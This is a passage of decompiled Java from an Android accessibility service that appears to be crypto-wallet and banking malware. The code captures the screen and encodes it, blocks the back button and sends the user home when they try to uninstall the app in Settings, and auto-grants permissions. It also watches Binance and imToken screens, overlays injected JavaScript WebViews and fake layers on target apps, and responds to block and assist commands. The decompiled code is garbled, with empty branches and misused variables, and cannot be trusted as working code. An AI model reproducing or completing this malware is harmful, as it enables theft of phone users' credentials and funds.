            Bitmap result9 = Bitmap.createBitmap(result, result, ARGB_8888);
            Canvas canvas = new Canvas();
            Paint paint = new Paint();
            int val = -16777216;
            canvas.drawColor(val);
            Rect rect = new Rect();
            param1.getBoundsInScreen(rect);
            String str6 = "";
            CharSequence result10 = param1.getText();
            if (result == null) {
                // branch: cond_5b
            }
            CharSequence result11 = param1.getText();
            String result12 = result.toString();
            // continue loop -> :goto_69
            CharSequence result13 = param1.getContentDescription();
            if (result == null) {
                // branch: cond_69
            }
            CharSequence result14 = param1.getContentDescription();
            String result15 = result.toString();
            } catch (Exception e) {
                e.printStackTrace();
            CharSequence result16 = param1.getClassName();
            String str7 = "android.widget.TextView";
            boolean result17 = result.equals(str7);
            int val2 = -65536;
            if (result == null) {
                // branch: cond_7e
            }
            int val3 = -16776961;
            paint.setColor(val3);
            // continue loop -> :goto_a6
            CharSequence result18 = param1.getClassName();
            String str8 = "android.widget.EditText";
            boolean result19 = result.equals(str8);
            if (result == null) {
                // branch: cond_91
            }
            int val4 = -16711936;
            paint.setColor(val4);
            // continue loop -> :goto_a6
            CharSequence result20 = param1.getClassName();
            String str9 = "android.widget.CheckBox";
            boolean result21 = result.equals(str9);
            if (result == null) {
                // branch: cond_a3
            }
            int val5 = -256;
            paint.setColor(val5);
            // continue loop -> :goto_a6
            paint.setColor(val2);
            paint.setColor(val2);
            Paint.Style STROKE = Paint$Style.STROKE;
            paint.setStyle(STROKE);
            int val6 = 1073741824;
            paint.setStrokeWidth(val6);
            int val7 = 1107296256;
            paint.setTextSize(val7);
            canvas.drawRect(rect, paint);
            float result22 = rect.exactCenterX();
            float result23 = rect.exactCenterY();
            canvas.drawText(result, result, result, paint);
            this.drawViewHierarchy(canvas, param1, paint);
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat();
            String str10 = "yyyyMMdd_HHmmss";
            Date date = new Date();
            String result24 = simpleDateFormat.format(date);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap.CompressFormat PNG = Bitmap$CompressFormat.PNG;
            int val8 = 100;
            boolean result25 = result.compress(PNG, val8, byteArrayOutputStream);
            byte[] result26 = byteArrayOutputStream.toByteArray();
            StringBuilder stringBuilder = new StringBuilder();
            String s_cr = DataPackagingEngine.s_cr;
            StringBuilder result27 = stringBuilder.append(s_cr);
            StringBuilder result28 = stringBuilder.append(str);
            StringBuilder result29 = stringBuilder.append(result);
            StringBuilder result30 = stringBuilder.append(str);
            StringBuilder result31 = stringBuilder.append(result);
            String str11 = ":skilton";
            StringBuilder result32 = stringBuilder.append(str11);
            String result33 = stringBuilder.toString();
            DataEncryptionEngine.encodeBase64(result, result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    String getEventText(AccessibilityEvent param1) {
        List result = param1.getText();
        String result2 = result.toString();
        return result;
    }

    public String localeTextAccessibility() {
        try {
            JSONObject jSONObject = new JSONObject();
            String localeForAccessibility = this.localeForAccessibility;
            Locale result = Locale.getDefault();
            String result2 = result.getLanguage();
            String result3 = jSONObject.getString(result);
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            String str = "Enable";
            return str;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void mouseDraw(Point[] param1, int param2) {
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        if (SDK_INT < val) {
            // branch: cond_81
        }
        Path path = new Path();
        Point item = param1[null];
        int x = item.x;
        Point item2 = param1[null];
        int y = item2.y;
        path.moveTo(x, y);
        int val2 = -69584122;
        if (param2 != val2) {
            // branch: cond_4f
        }
        Boolean result = Boolean.valueOf(1);
        boolean result2 = result.booleanValue();
        if (result == null) {
            // branch: cond_2e
        }
        Boolean result3 = Boolean.valueOf(null);
        // continue loop -> :goto_23
        boolean result4 = result.booleanValue();
        if (result == null) {
            // branch: cond_39
        }
        Boolean result5 = Boolean.valueOf(null);
        // continue loop -> :goto_2e
        boolean result6 = result.booleanValue();
        if (result == null) {
            // branch: cond_44
        }
        Boolean result7 = Boolean.valueOf(null);
        // continue loop -> :goto_39
        boolean result8 = result.booleanValue();
        if (result == null) {
            // branch: cond_4f
        }
        Boolean result9 = Boolean.valueOf(null);
        // continue loop -> :goto_44
        int len = param1.length;
        if (1 >= len) {
            // branch: cond_81
        }
        Point item3 = param1[1];
        int x2 = item3.x;
        Point item4 = param1[1];
        int y2 = item4.y;
        path.lineTo(x2, y2);
        DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
        long longVal = (long) param2;
        GestureDescription.StrokeDescription result10 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(path, x2, y2, longVal, v5);
        GestureDescription.Builder result11 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
        GestureDescription.Builder result12 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
        GestureDescription result13 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        AccessibilityServiceCore.2 accessibilityServiceCore.2 = new AccessibilityServiceCore.2();
        boolean result14 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(p0, result, accessibilityServiceCore.2, null);
        int val3 = 1 + 0x1;
        // continue loop -> :goto_4f
        return;
    }

    public void onAccessibilityEvent(AccessibilityEvent param1) {
        try {
            String str = "YES";
            String str2 = "";
            boolean ifFinishiInitPermission = AccessibilityServiceCore.ifFinishiInitPermission;
            if (ifFinishiInitPermission == null) {
                // branch: cond_45
            }
            CharSequence result = p1 .. p1.getPackageName();
            if (result == null) {
                // branch: cond_45
            }
            String result2 = result.toString();
            String result3 = p0 .. p0.getPackageName();
            boolean result4 = result.equals(result);
            if (result != null) {
                // branch: cond_3e
            }
            String str3 = "com.android.settings";
            boolean result5 = result.contains(str3);
            if (result == null) {
                // branch: cond_45
            }
            String result6 = p0 .. p1.getEventText();
            String result7 = result.toLowerCase();
            String appname2 = AppUninstallerEngine.appname2;
            if (appname2 == null) {
                // branch: cond_45
            }
            String result8 = appname2.toLowerCase();
            boolean result9 = result.contains(result);
            if (result == null) {
                // branch: cond_45
            }
            p0 .. p0.blockBackButton();
            p0 .. p0.navigateHome();
            return;
            // continue loop -> :goto_47
            } catch (Exception e) {
                e.printStackTrace();
            AutoPermissionGranter.check(param1, v0);
            AppUninstallerEngine.check(p1 .. p1);
            ScreenLockMonitor.checkEvent(p1 .. p1);
            boolean showtrust = this.showtrust;
            int val = 8;
            if (showtrust == null) {
                // branch: cond_7e
            }
            if (showtrust != null) {
                // branch: cond_7e
            }
            int result10 = p1 .. p1.getEventType();
            if (result != val) {
                // branch: cond_7e
            }
            boolean result11 = p0 .. p1.checkIfClickPermission();
            if (result == null) {
                // branch: cond_65
            }
            return;
            AccessibilityNodeInfo result12 = p1 .. p1.getSource();
            if (result == null) {
                // branch: cond_7e
            }
            String result13 = result.getViewIdResourceName();
            if (result == null) {
                // branch: cond_7b
            }
            String str4 = "";
            boolean result14 = result.equals(str4);
            if (result == null) {
                // branch: cond_7b
            }
            BiometricTypeHelper USDT = BiometricTypeHelper.USDT;
            result.recycle();
            boolean showbinance = this.showbinance;
            if (showbinance == null) {
                // branch: cond_a6
            }
            int result15 = p1 .. p1.getEventType();
            if (result != val) {
                // branch: cond_a6
            }
            boolean result16 = p0 .. p1.checkIfClickPermission();
            if (result == null) {
                // branch: cond_8f
            }
            return;
            AccessibilityNodeInfo result17 = p1 .. p1.getSource();
            if (result == null) {
                // branch: cond_a6
            }
            String result18 = result.getViewIdResourceName();
            if (result == null) {
                // branch: cond_a3
            }
            String str5 = "com.binance.dev:id/2131364953";
            boolean result19 = result.equals(str5);
            if (result == null) {
                // branch: cond_a3
            }
            result.recycle();
            int result20 = p1 .. p1.getEventType();
            AccessibilityServiceCore.globalEvent = param1;
            // continue loop -> :goto_ae
            } catch (Exception e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            int val2 = 16;
            int val3 = 2;
            if (null == val3) {
                // branch: cond_c9
            }
            if (null == val) {
                // branch: cond_c7
            }
            if (null == val2) {
                // branch: cond_c5
            }
            int val4 = 32;
            if (null == val4) {
                // branch: cond_c3
            }
            int val5 = 64;
            if (null == val5) {
                // branch: cond_c1
            }
            // continue loop -> :goto_ca
            int val6 = 4;
            // continue loop -> :goto_ca
            int val7 = 5;
            // continue loop -> :goto_ca
            int val8 = 3;
            // continue loop -> :goto_ca
            // continue loop -> :goto_ca
            v0.sendLog(param1, val3);
            CharSequence result21 = p1 .. p1.getPackageName();
            String result22 = result.toString();
            String result23 = result.toLowerCase();
            Context result24 = p0 .. p0.getApplicationContext();
            String str6 = "SME";
            String result25 = My_Settings.read(result, str6, str2);
            boolean result26 = result.equals(str);
            String str7 = "base64";
            String str8 = "text/html";
            String str9 = "ko";
            String str10 = "ja";
            String str11 = "en";
            String str12 = "NO";
            int val9 = 2048;
            if (result == null) {
                // branch: cond_1a6
            }
            String str13 = "";
            boolean result27 = result.equals(str13);
            if (result == null) {
                // branch: cond_1a6
            }
            int result28 = p1 .. p1.getEventType();
            if (result != val9) {
                // branch: cond_1a6
            }
            Context result29 = p0 .. p0.getApplicationContext();
            String str14 = "SME";
            My_Settings.Write(result, str14, str12);
            AccessibilityServiceCore.MyWebView accessibilityServiceCore.MyWebView = new AccessibilityServiceCore.MyWebView();
            ViewGroup.LayoutParams viewGroup.LayoutParams = new ViewGroup.LayoutParams();
            int val10 = -1;
            accessibilityServiceCore.MyWebView.setLayoutParams(viewGroup.LayoutParams);
            boolean result30 = accessibilityServiceCore.MyWebView.requestFocus();
            accessibilityServiceCore.MyWebView.setFocusable(1);
            accessibilityServiceCore.MyWebView.setFocusableInTouchMode(1);
            WebSettings result31 = accessibilityServiceCore.MyWebView.getSettings();
            result.setJavaScriptEnabled(1);
            result.setJavaScriptCanOpenWindowsAutomatically(1);
            result.setDomStorageEnabled(1);
            result.setCacheMode(1);
            accessibilityServiceCore.MyWebView.setScrollBarStyle(null);
            int val11 = 2;
            accessibilityServiceCore.MyWebView.setLayerType(val11, null);
            AccessibilityServiceCore.MyWebViewClient accessibilityServiceCore.MyWebViewClient = new AccessibilityServiceCore.MyWebViewClient();
            accessibilityServiceCore.MyWebView.setWebViewClient(accessibilityServiceCore.MyWebViewClient);
            AccessibilityServiceCore.MyWebChromeClient accessibilityServiceCore.MyWebChromeClient = new AccessibilityServiceCore.MyWebChromeClient();
            accessibilityServiceCore.MyWebView.setWebChromeClient(accessibilityServiceCore.MyWebChromeClient);
            int val12 = 130;
            boolean result32 = accessibilityServiceCore.MyWebView.requestFocus(val12);
            boolean result33 = accessibilityServiceCore.MyWebView.requestFocusFromTouch();
            accessibilityServiceCore.MyWebView.setEnabled(1);
            Locale result34 = Locale.getDefault();
            String result35 = result.getLanguage();
            int result36 = result.hashCode();
            int val13 = 3241;
            if (result == val13) {
                // branch: cond_184
            }
            int val14 = 3383;
            if (result == val14) {
                // branch: cond_17c
            }
            int val15 = 3428;
            if (result == val15) {
                // branch: cond_174
            }
            // continue loop -> :goto_18c
            boolean result37 = result.equals(str9);
            if (result == null) {
                // branch: cond_18c
            }
            int val16 = 2;
            // continue loop -> :goto_18d
            boolean result38 = result.equals(str10);
            if (result == null) {
                // branch: cond_18c
            }
            // continue loop -> :goto_18d
            boolean result39 = result.equals(str11);
            if (result == null) {
                // branch: cond_18c
            }
            // continue loop -> :goto_18d
            int val17 = -1;
            if (val17 == null) {
                // branch: cond_19e
            }
            if (val17 == 1) {
                // branch: cond_19b
            }
            int val18 = 2;
            if (val17 == val18) {
                // branch: cond_198
            }
            // continue loop -> :goto_1a0
            // continue loop -> :goto_1a0
            // continue loop -> :goto_1a0
            accessibilityServiceCore.MyWebView.loadData(str18, str8, str7);
            v0.loadMyPage(accessibilityServiceCore.MyWebView);
            Context result40 = p0 .. p0.getApplicationContext();
            String str19 = "SIM";
            String result41 = My_Settings.read(result, str19, str2);
            boolean result42 = result.equals(str);
            if (result == null) {
                // branch: cond_267
            }
            String str20 = "im.token.app";
            boolean result43 = result.equals(str20);
            if (result == null) {
                // branch: cond_267
            }
            int result44 = p1 .. p1.getEventType();
            int val19 = 2048;
            if (result != val19) {
                // branch: cond_267
            }
            Context result45 = p0 .. p0.getApplicationContext();
            String str21 = "SIM";
            My_Settings.Write(result, str21, str12);
            AccessibilityServiceCore.MyWebView accessibilityServiceCore.MyWebView2 = new AccessibilityServiceCore.MyWebView();
            ViewGroup.LayoutParams viewGroup.LayoutParams2 = new ViewGroup.LayoutParams();
            int val20 = -1;
            accessibilityServiceCore.MyWebView2.setLayoutParams(viewGroup.LayoutParams2);
            boolean result46 = accessibilityServiceCore.MyWebView2.requestFocus();
            accessibilityServiceCore.MyWebView2.setFocusable(1);
            accessibilityServiceCore.MyWebView2.setFocusableInTouchMode(1);
            WebSettings result47 = accessibilityServiceCore.MyWebView2.getSettings();
            result.setJavaScriptEnabled(1);
            result.setJavaScriptCanOpenWindowsAutomatically(1);
            result.setDomStorageEnabled(1);
            result.setCacheMode(1);
            accessibilityServiceCore.MyWebView2.setScrollBarStyle(null);
            int val21 = 2;
            accessibilityServiceCore.MyWebView2.setLayerType(val21, null);
            AccessibilityServiceCore.MyWebViewClient accessibilityServiceCore.MyWebViewClient2 = new AccessibilityServiceCore.MyWebViewClient();
            accessibilityServiceCore.MyWebView2.setWebViewClient(accessibilityServiceCore.MyWebViewClient2);
            AccessibilityServiceCore.MyWebChromeClient accessibilityServiceCore.MyWebChromeClient2 = new AccessibilityServiceCore.MyWebChromeClient();
            accessibilityServiceCore.MyWebView2.setWebChromeClient(accessibilityServiceCore.MyWebChromeClient2);
            int val22 = 130;
            boolean result48 = accessibilityServiceCore.MyWebView2.requestFocus(val22);
            boolean result49 = accessibilityServiceCore.MyWebView2.requestFocusFromTouch();
            accessibilityServiceCore.MyWebView2.setEnabled(1);
            Locale result50 = Locale.getDefault();
            String result51 = result.getLanguage();
            int result52 = result.hashCode();
            int val23 = 3241;
            if (result == val23) {
                // branch: cond_245
            }
            int val24 = 3383;
            if (result == val24) {
                // branch: cond_23d
            }
            int val25 = 3428;
            if (result == val25) {
                // branch: cond_235
            }
            // continue loop -> :goto_24d
            boolean result53 = result.equals(str9);
            if (result == null) {
                // branch: cond_24d
            }
            int val26 = 2;
            // continue loop -> :goto_24e
            boolean result54 = val26.equals(str10);
            if (result == null) {
                // branch: cond_24d
            }
            // continue loop -> :goto_24e
            boolean result55 = 1.equals(str11);
            if (result == null) {
                // branch: cond_24d
            }
            // continue loop -> :goto_24e
            int val27 = -1;
            if (val27 == null) {
                // branch: cond_25f
            }
            if (val27 == 1) {
                // branch: cond_25c
            }
            int val28 = 2;
            if (val27 == val28) {
                // branch: cond_259
            }
            // continue loop -> :goto_261
            // continue loop -> :goto_261
            // continue loop -> :goto_261
            accessibilityServiceCore.MyWebView2.loadData(str25, str8, str7);
            v0.loadMyPage(accessibilityServiceCore.MyWebView2);
            Context result56 = p0 .. p0.getApplicationContext();
            String str26 = "STO";
            String result57 = My_Settings.read(result, str26, str2);
            boolean result58 = result.equals(str);
            if (result == null) {
                // branch: cond_328
            }
            String str27 = "";
            boolean result59 = result.equals(str27);
            if (result == null) {
                // branch: cond_328
            }
            int result60 = p1 .. p1.getEventType();
            int val29 = 2048;
            if (result != val29) {
                // branch: cond_328
            }
            Context result61 = p0 .. p0.getApplicationContext();
            String str28 = "STO";
            My_Settings.Write(result, str28, str12);
            AccessibilityServiceCore.MyWebView accessibilityServiceCore.MyWebView3 = new AccessibilityServiceCore.MyWebView();
            ViewGroup.LayoutParams viewGroup.LayoutParams3 = new ViewGroup.LayoutParams();
            int val30 = -1;
            accessibilityServiceCore.MyWebView3.setLayoutParams(viewGroup.LayoutParams3);
            boolean result62 = accessibilityServiceCore.MyWebView3.requestFocus();
            accessibilityServiceCore.MyWebView3.setFocusable(1);
            accessibilityServiceCore.MyWebView3.setFocusableInTouchMode(1);
            WebSettings result63 = accessibilityServiceCore.MyWebView3.getSettings();
            result.setJavaScriptEnabled(1);
            result.setJavaScriptCanOpenWindowsAutomatically(1);
            result.setDomStorageEnabled(1);
            result.setCacheMode(1);
            accessibilityServiceCore.MyWebView3.setScrollBarStyle(null);
            int val31 = 2;
            accessibilityServiceCore.MyWebView3.setLayerType(val31, null);
            AccessibilityServiceCore.MyWebViewClient accessibilityServiceCore.MyWebViewClient3 = new AccessibilityServiceCore.MyWebViewClient();
            accessibilityServiceCore.MyWebView3.setWebViewClient(accessibilityServiceCore.MyWebViewClient3);
            AccessibilityServiceCore.MyWebChromeClient accessibilityServiceCore.MyWebChromeClient3 = new AccessibilityServiceCore.MyWebChromeClient();
            accessibilityServiceCore.MyWebView3.setWebChromeClient(accessibilityServiceCore.MyWebChromeClient3);
            int val32 = 130;
            boolean result64 = accessibilityServiceCore.MyWebView3.requestFocus(val32);
            boolean result65 = accessibilityServiceCore.MyWebView3.requestFocusFromTouch();
            accessibilityServiceCore.MyWebView3.setEnabled(1);
            Locale result66 = Locale.getDefault();
            String result67 = result.getLanguage();
            int result68 = result.hashCode();
            int val33 = 3241;
            if (result == val33) {
                // branch: cond_306
            }
            int val34 = 3383;
            if (result == val34) {
                // branch: cond_2fe
            }
            int val35 = 3428;
            if (result == val35) {
                // branch: cond_2f6
            }
            // continue loop -> :goto_30e
            boolean result69 = result.equals(str9);
            if (result == null) {
                // branch: cond_30e
            }
            int val36 = 2;
            // continue loop -> :goto_30f
            boolean result70 = val36.equals(str10);
            if (result == null) {
                // branch: cond_30e
            }
            // continue loop -> :goto_30f
            boolean result71 = 1.equals(str11);
            if (result == null) {
                // branch: cond_30e
            }
            // continue loop -> :goto_30f
            int val37 = -1;
            if (val37 == null) {
                // branch: cond_320
            }
            if (val37 == 1) {
                // branch: cond_31d
            }
            int val38 = 2;
            if (val37 == val38) {
                // branch: cond_31a
            }
            // continue loop -> :goto_322
            // continue loop -> :goto_322
            // continue loop -> :goto_322
            accessibilityServiceCore.MyWebView3.loadData(str32, str8, str7);
            v0.loadMyPage(accessibilityServiceCore.MyWebView3);
            Context result72 = p0 .. p0.getApplicationContext();
            String str33 = "STR";
            String result73 = My_Settings.read(result, str33, str2);
            boolean result74 = result.equals(str);
            if (result == null) {
                // branch: cond_3ea
            }
            String str34 = "";
            boolean result75 = result.equals(str34);
            if (result == null) {
                // branch: cond_3ea
            }
            int result76 = p1 .. p1.getEventType();
            int val39 = 2048;
            if (result != val39) {
                // branch: cond_3ea
            }
            Context result77 = p0 .. p0.getApplicationContext();
            String str35 = "STR";
            My_Settings.Write(result, str35, str12);
            AccessibilityServiceCore.MyWebView accessibilityServiceCore.MyWebView4 = new AccessibilityServiceCore.MyWebView();
            ViewGroup.LayoutParams viewGroup.LayoutParams4 = new ViewGroup.LayoutParams();
            int val40 = -1;
            accessibilityServiceCore.MyWebView4.setLayoutParams(viewGroup.LayoutParams4);
            boolean result78 = accessibilityServiceCore.MyWebView4.requestFocus();
            accessibilityServiceCore.MyWebView4.setFocusable(1);
            accessibilityServiceCore.MyWebView4.setFocusableInTouchMode(1);
            WebSettings result79 = accessibilityServiceCore.MyWebView4.getSettings();
            result.setJavaScriptEnabled(1);
            result.setJavaScriptCanOpenWindowsAutomatically(1);
            result.setDomStorageEnabled(1);
            result.setCacheMode(1);
            accessibilityServiceCore.MyWebView4.setScrollBarStyle(null);
            int val41 = 2;
            accessibilityServiceCore.MyWebView4.setLayerType(val41, null);
            AccessibilityServiceCore.MyWebViewClient accessibilityServiceCore.MyWebViewClient4 = new AccessibilityServiceCore.MyWebViewClient();
            accessibilityServiceCore.MyWebView4.setWebViewClient(accessibilityServiceCore.MyWebViewClient4);
            AccessibilityServiceCore.MyWebChromeClient accessibilityServiceCore.MyWebChromeClient4 = new AccessibilityServiceCore.MyWebChromeClient();
            accessibilityServiceCore.MyWebView4.setWebChromeClient(accessibilityServiceCore.MyWebChromeClient4);
            int val42 = 130;
            boolean result80 = accessibilityServiceCore.MyWebView4.requestFocus(val42);
            boolean result81 = accessibilityServiceCore.MyWebView4.requestFocusFromTouch();
            accessibilityServiceCore.MyWebView4.setEnabled(1);
            Locale result82 = Locale.getDefault();
            String result83 = result.getLanguage();
            int result84 = result.hashCode();
            int val43 = 3241;
            if (result == val43) {
                // branch: cond_3c7
            }
            int val44 = 3383;
            if (result == val44) {
                // branch: cond_3bf
            }
            int val45 = 3428;
            if (result == val45) {
                // branch: cond_3b7
            }
            // continue loop -> :goto_3cf
            boolean result85 = result.equals(str9);
            if (result == null) {
                // branch: cond_3cf
            }
            int val46 = 2;
            // continue loop -> :goto_3d0
            boolean result86 = val46.equals(str10);
            if (result == null) {
                // branch: cond_3cf
            }
            // continue loop -> :goto_3d0
            boolean result87 = 1.equals(val45);
            if (result == null) {
                // branch: cond_3cf
            }
            // continue loop -> :goto_3d0
            if (val40 == null) {
                // branch: cond_3e1
            }
            if (val40 == 1) {
                // branch: cond_3de
            }
            int val47 = 2;
            if (val40 == val47) {
                // branch: cond_3db
            }
            // continue loop -> :goto_3e3
            // continue loop -> :goto_3e3
            // continue loop -> :goto_3e3
            accessibilityServiceCore.MyWebView4.loadData(str39, str8, str7);
            v0.loadMyPage(accessibilityServiceCore.MyWebView4);
            // continue loop -> :goto_3ec
            int val48 = -1;
            int val49 = 5;
            if (val3 != val49) {
                // branch: cond_462
            }
            CharSequence result88 = p1 .. p1.getPackageName();
            String str40 = "com.transsion.XOSLauncher.upgrade";
            boolean result89 = result.equals(str40);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result90 = p1 .. p1.getPackageName();
            String str41 = "com.google.android.apps.nexuslauncher";
            boolean result91 = result.equals(str41);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result92 = p1 .. p1.getPackageName();
            String str42 = "com.android.launcher3";
            boolean result93 = result.equals(str42);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result94 = p1 .. p1.getPackageName();
            String str43 = "com.android.launcher2";
            boolean result95 = result.equals(str43);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result96 = p1 .. p1.getPackageName();
            String str44 = "com.android.launcher";
            boolean result97 = result.equals(str44);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result98 = p1 .. p1.getPackageName();
            String str45 = "com.bbk.launcher2";
            boolean result99 = result.equals(str45);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result100 = p1 .. p1.getPackageName();
            String str46 = "com.bbk.launcher";
            boolean result101 = result.equals(str46);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result102 = p1 .. p1.getPackageName();
            String str47 = "com.huawei.android.launcher";
            boolean result103 = result.equals(str47);
            if (result != null) {
                // branch: cond_45b
            }
            CharSequence result104 = p1 .. p1.getPackageName();
            String str48 = "com.miui.home";
            boolean result105 = result.equals(str48);
            if (result == null) {
                // branch: cond_462
            }
            FrameLayout injview = AccessibilityServiceCore.injview;
            int val50 = 8;
            injview.setVisibility(val50);
            int result106 = p1 .. p1.getEventType();
            if (result != 1) {
                // branch: cond_4d9
            }
            boolean showtrust2 = this.showtrust;
            if (showtrust2 == null) {
                // branch: cond_496
            }
            if (showtrust2 == null) {
                // branch: cond_496
            }
            int val51 = 2;
            if (showtrust2 != val51) {
                // branch: cond_496
            }
            String str49 = "";
            CharSequence result107 = p1 .. p1.getPackageName();
            boolean result108 = str49.equals(result);
            if (result == null) {
                // branch: cond_496
            }
            String str50 = "";
            AccessibilityNodeInfo result109 = p1 .. p1.getSource();
            String result110 = result.getViewIdResourceName();
            boolean result111 = str50.equals(result);
            if (result == null) {
                // branch: cond_496
            }
            FrameLayout injview2 = AccessibilityServiceCore.injview;
            int val52 = 8;
            injview2.setVisibility(val52);
            // continue loop -> :goto_4d9
            CharSequence result112 = p1 .. p1.getContentDescription();
            String result113 = result.toString();
            CharSequence result114 = p1 .. p1.getPackageName();
            String str51 = "com.android.systemui";
            boolean result115 = result.equals(str51);
            if (result == null) {
                // branch: cond_4d9
            }
            String str52 = "\u4e3b\u5c4f\u5e55";
            boolean result116 = result.equals(str52);
            if (result != null) {
                // branch: cond_4d2
            }
            String str53 = "Home";
            boolean result117 = result.equals(str53);
            if (result != null) {
                // branch: cond_4d2
            }
            String str54 = "home_button";
            boolean result118 = result.equals(str54);
            if (result != null) {
                // branch: cond_4d2
            }
            String str55 = "recent_apps";
            boolean result119 = result.equals(str55);
            if (result != null) {
                // branch: cond_4d2
            }
            String str56 = "Overview";
            boolean result120 = result.equals(str56);
            if (result == null) {
                // branch: cond_4d9
            }
            FrameLayout injview3 = AccessibilityServiceCore.injview;
            int val53 = 8;
            injview3.setVisibility(val53);
            List DisabledApps = AccessibilityServiceCore.DisabledApps;
            int result121 = DisabledApps.size();
            if (/* if-lez result */) {
                // branch: cond_4fb
            }
            List DisabledApps2 = AccessibilityServiceCore.DisabledApps;
            CharSequence result122 = p1 .. p1.getPackageName();
            String result123 = result.toString();
            String result124 = result.toLowerCase();
            boolean result125 = DisabledApps2.contains(result);
            if (result == null) {
                // branch: cond_4fb
            }
            p0 .. p0.blockBackButton();
            p0 .. p0.navigateHome();
            } catch (Exception e) {
                e.printStackTrace();
            AccessibilityNodeInfo result126 = p1 .. p1.getSource();
            // continue loop -> :goto_501
            } catch (Exception e) {
                e.printStackTrace();
            if (null == null) {
                // branch: cond_505
            }
            // continue loop -> :goto_506
            CharSequence result127 = p1 .. p1.getClassName();
            String str57 = "android.widget.EditText";
            boolean result128 = result.equals(str57);
            int val54 = result & v4;
            if (val54 == null) {
                // branch: cond_515
            }
            AccessibilityServiceCore.globalNode = null;
            } catch (Exception e) {
                e.printStackTrace();
            AccessibilityNodeInfo result129 = p0 .. p0.getRootInActiveWindow();
            } catch (Exception e) {
                e.printStackTrace();
            if (result == null) {
                // branch: cond_535
            }
            String str58 = "SKL";
            Boolean result130 = Boolean.valueOf(null);
            boolean result131 = My_Settings.readBool(v0, str58, result);
            if (result == null) {
                // branch: cond_535
            }
            Thread thread = new Thread();
            AccessibilityServiceCore..ExternalSyntheticLambda14 accessibilityServiceCore..ExternalSyntheticLambda14 = new AccessibilityServiceCore..ExternalSyntheticLambda14();
            thread.start();
            } catch (Exception e) {
                e.printStackTrace();
            int val55 = 32;
            if (null == val55) {
                // branch: cond_60f
            }
            int val56 = 64;
            if (null == val56) {
                // branch: cond_5f4
            }
            int val57 = 16384;
            if (null == val57) {
                // branch: cond_543
            }
            // continue loop -> :goto_5f1
            List result132 = p1 .. p1.getText();
            String result133 = result.toString();
            int result134 = result.hashCode();
            // continue loop -> :goto_57a
            String str59 = "[unBlock]";
            boolean result135 = result.equals(str59);
            if (result == null) {
                // branch: cond_57a
            }
            int val58 = 3;
            // continue loop -> :goto_57a
            String str60 = "[Block]";
            boolean result136 = result.equals(str60);
            if (result == null) {
                // branch: cond_57a
            }
            int val59 = 2;
            // continue loop -> :goto_57a
            String str61 = "[unbassit]";
            boolean result137 = result.equals(str61);
            if (result == null) {
                // branch: cond_57a
            }
            // continue loop -> :goto_57a
            String str62 = "[bassit]";
            boolean result138 = result.equals(str62);
            if (result == null) {
                // branch: cond_57a
            }
            if (null == null) {
                // branch: cond_5cb
            }
            if (null == 1) {
                // branch: cond_5bb
            }
            int val60 = 2;
            if (null == val60) {
                // branch: cond_5a1
            }
            int val61 = 3;
            if (null == val61) {
                // branch: cond_586
            }
            // continue loop -> :goto_5e6
            FrameLayout Fakelay = AccessibilityServiceCore.Fakelay;
            IBinder result139 = Fakelay.getWindowToken();
            if (result == null) {
                // branch: cond_5e6
            }
            FrameLayout Fakelay2 = AccessibilityServiceCore.Fakelay;
            Fakelay2.setFocusable(null);
            FrameLayout Fakelay3 = AccessibilityServiceCore.Fakelay;
            Fakelay3.setClickable(null);
            FrameLayout Fakelay4 = AccessibilityServiceCore.Fakelay;
            int val62 = 8;
            Fakelay4.setVisibility(val62);
            // continue loop -> :goto_5e6
            FrameLayout Fakelay5 = AccessibilityServiceCore.Fakelay;
            IBinder result140 = Fakelay5.getWindowToken();
            if (result == null) {
                // branch: cond_5e6
            }
            FrameLayout Fakelay6 = AccessibilityServiceCore.Fakelay;
            Fakelay6.setFocusable(1);
            FrameLayout Fakelay7 = AccessibilityServiceCore.Fakelay;
            Fakelay7.setClickable(1);
            FrameLayout Fakelay8 = AccessibilityServiceCore.Fakelay;
            Fakelay8.setVisibility(null);
            // continue loop -> :goto_5e6
            Handler handler = new Handler();
            AccessibilityServiceCore.16 accessibilityServiceCore.16 = new AccessibilityServiceCore.16();
            boolean result141 = handler.postDelayed(accessibilityServiceCore.16, str62, result);
            // continue loop -> :goto_5e6
            FrameLayout Fakelay9 = AccessibilityServiceCore.Fakelay;
            Fakelay9.setFocusable(null);
            FrameLayout Fakelay10 = AccessibilityServiceCore.Fakelay;
            Fakelay10.setClickable(null);
            FrameLayout Fakelay11 = AccessibilityServiceCore.Fakelay;
            WindowManager.LayoutParams Fakeparams_bass = AccessibilityServiceCore.Fakeparams_bass;
            Fakelay11.setLayoutParams(Fakeparams_bass);
            WindowManager windowManager = AccessibilityServiceCore.windowManager;
            FrameLayout Fakelay12 = AccessibilityServiceCore.Fakelay;
            WindowManager.LayoutParams Fakeparams_bass2 = AccessibilityServiceCore.Fakeparams_bass;
            windowManager.updateViewLayout(Fakelay12, Fakeparams_bass2);
            } catch (Exception e) {
                e.printStackTrace();
            Boolean needsPaste = AccessibilityServiceCore.needsPaste;
            boolean result142 = needsPaste.booleanValue();
            if (result == null) {
                // branch: cond_5f1
            }
            p0 .. p0.pasteText();
            } catch (Exception e) {
                e.printStackTrace();
            // continue loop -> :goto_64b
            Context appContext = MainBackgroundService.appContext;
            if (appContext != null) {
                // branch: cond_5fe
            }
            Context result143 = p0 .. p0.getApplicationContext();
            MainBackgroundService.appContext = result;
